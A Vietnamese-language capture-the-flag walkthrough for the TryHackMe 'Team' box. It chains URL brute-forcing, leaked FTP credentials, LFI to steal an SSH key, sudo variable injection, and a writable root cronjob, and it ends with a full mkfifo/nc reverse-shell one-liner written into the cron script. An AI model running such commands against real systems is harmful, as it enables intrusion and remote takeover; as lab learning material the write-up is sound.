Port scan:

![enter image description here](https://imgur.com/4EocEoK.png)

![enter image description here](https://imgur.com/tlOje7Q.png)

Truy cập web app, chỉ có default page của Ubuntu:

![enter image description here](https://imgur.com/R2ng3LV.png)

URL Brute-force cũng không đem lại kết quả khả quan. Tuy nhiên, khi xem page source lại có manh mối ở thẻ title:

![enter image description here](https://imgur.com/i5CNeMh.png)

Thêm host team.thm vào /etc/hosts.
Giao diện của team.thm:

![enter image description here](https://imgur.com/MJllFxE.png)

Có vẻ như không có gì để khai thác. Ta sẽ url brute-force:

![enter image description here](https://imgur.com/yh8Q0Uq.png)

/images không có gì đáng chú ý.
/scripts/ và /assets/ bị 403.
/robots.txt có nội dung có thể là 1 user:

![enter image description here](https://imgur.com/YmCIGir.png)

Tiếp tục URL Brute-force vào /scripts/

![enter image description here](https://imgur.com/mIMqV08.png)

Tìm thấy file script.txt (status 200) có vẻ hay. Nội dung:

![enter image description here](https://imgur.com/7qjngkB.png)

Từ đây ta có thông tin về việc tồn tại bản cũ của file script này ở trong folder hiện tại. Thử tìm kiếm với các tên `script.sh, script.log, script.old,...` và may mắn tìm được file script.old. Tải về và đọc nội dung file script.old:

![enter image description here](https://imgur.com/1a3Ttth.png)

Ta đã có được FTP credentials, dùng nó để truy cập vào FTP server.

![enter image description here](https://imgur.com/RTaVUGb.png)

Kéo file New_site.txt từ folder workshare về local và đọc nội dung:

![enter image description here](https://imgur.com/11w9eDE.png)

Theo mô tả trong file New_site.txt, thêm dev.team.thm vào /etc/hosts.
Truy cập vào dev.team.thm:

![enter image description here](https://imgur.com/GgqjHCQ.png)

Click vào link và được redirect đến:

![enter image description here](https://imgur.com/cFmh2vM.png)

Tại đây có vẻ tồn tại lỗ hổng LFI. Thử đọc /etc/passwd:

![enter image description here](https://imgur.com/dSFhzwf.png)

Xác nhận có LFI và thu thập được 3 user đáng chú ý là dale, gyles, ftpuser.
File New_site.txt cũng đề cập đến việc có thể tồn tại file id_rsa ở trong thư mục config liên quan. Lợi dụng LFI để truy cập vào /home/dale/.ssh/id_rsa nhưng không có gì -> loại. Thử truy cập vào /etc/ssh/sshd_config -> đọc được 1 file có chứa ssh private key của dale:

![enter image description here](https://imgur.com/vZxJ6ZJ.png)

Copy về local, loại bỏ dấu # và space, chỉnh sửa thành 1 file id_rsa hoàn chỉnh. chmod 600 và dùng file id_rsa này để ssh vào server.

![enter image description here](https://imgur.com/spQB1kk.png)

SSH vào server với user dale, lấy user flag ở /home/dale/user.txt:

![enter image description here](https://imgur.com/dheW0NT.png)

Check sudo right:

![enter image description here](https://imgur.com/M4VkNG9.png)

User dale có quyền chạy sudo nopasswd quyền gyles với lệnh `/home/gyles/admin_checks`. Vì ở target không có gói `binutils` nên ta dùng scp để download file admin_checks về local và dùng `strings` để phân tích:

![enter image description here](https://imgur.com/HLZPzfY.png)

Ta sẽ inject giá trị `/bin/bash` vào biến error để spawn shell của gyles khi chạy đến biến error.

![enter image description here](https://imgur.com/tiiBrNI.png)

Thành công leo quyền của gyles. Từ đây, ta thấy user gyles nằm trong group admin. Đầu tiên, dùng python để spawn pty. Sau đó, tìm các file, dir liên quan đến group admin:

![enter image description here](https://imgur.com/JW4zKYi.png)

Folder /opt/admin_stuff có file script.sh có thể đọc được (owner: root, mode 744).

![enter image description here](https://imgur.com/h3f4KhJ.png)

![enter image description here](https://imgur.com/RCfZD8M.png)

Nội dung nói rằng đã set cronjob chạy script trên mỗi phút 1 lần và gọi đến file /usr/local/bin/main_backup.sh. File /usr/local/bin/main_backup.sh (owner:  root, group admin, mode 775) cho phép group admin được chỉnh sửa nội dung, mà user gyles hiện tại ta đang nắm quyền nằm trong group admin.

![enter image description here](https://imgur.com/FV97A2V.png)

Dùng lệnh `echo rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.21.36 4445 >/tmp/f > /usr/local/bin/main_backup.sh` và mở listener ở local. Đợi khi script được chạy, ở local sẽ nhận được root shell. Lấy root flag ở /root/root.txt:

![enter image description here](https://imgur.com/7sXn98T.png)

Happy Hacking!
